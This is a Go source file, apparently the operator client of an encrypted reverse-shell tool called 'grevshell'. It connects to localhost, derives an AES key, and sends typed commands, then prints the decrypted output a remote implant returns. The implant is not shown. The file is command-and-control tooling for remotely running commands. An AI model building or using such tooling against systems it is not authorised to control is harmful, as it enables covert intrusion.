package main 

import (
	"log/slog"
	"fmt"
	"bufio"
	"encoding/binary"
	"io"
	"os"
	"strings"
	"net"

	"grevshell/grevcore"
)

func main() {
	stream, err := net.Dial("tcp", "localhost:9999")

	if err != nil {
		slog.Error("An error occured while establishing the server.", slog.Any("ERROR", err))
		return
	}

	defer stream.Close()

	for {
		slog.Info(fmt.Sprintf("Connecting to %s.", stream.RemoteAddr()))

		key, err := grevcore.DeriveKey(stream)

		if err != nil {
			slog.Error("An error occured while deriving the key.", slog.Any("ERROR", err))
			return
		}

		ProcessLoop(stream, key)
	}
}

func ProcessLoop(c net.Conn, key []byte) {
	send := bufio.NewReader(os.Stdin)
	defer c.Close()

	for {
		line, err := send.ReadString('\n')
		packetSize := make([]byte, 4)
		packetSizeSend := make([]byte, 4)

		if err != nil {
			slog.Error("An error occured while reading the command.", slog.Any("ERROR", err))
			continue
		}

		lineByte := []byte(line)
		encryptedData := grevcore.AesEncrypt(&lineByte, &key)
		binary.LittleEndian.PutUint32(packetSizeSend, uint32(len(encryptedData)))

		c.Write(packetSizeSend)
		c.Write(encryptedData)

		io.ReadFull(c, packetSize)
		size := binary.LittleEndian.Uint32(packetSize)

		recieved := make([]byte, size)
		io.ReadFull(c, recieved)

		if err != nil {
			slog.Error("An error occured while reading the server response.", slog.Any("ERROR", err))
			return
		}

		resp := string(grevcore.AesDecrypt(&recieved, &key))

		fmt.Println(strings.TrimSpace(resp))
	}
}
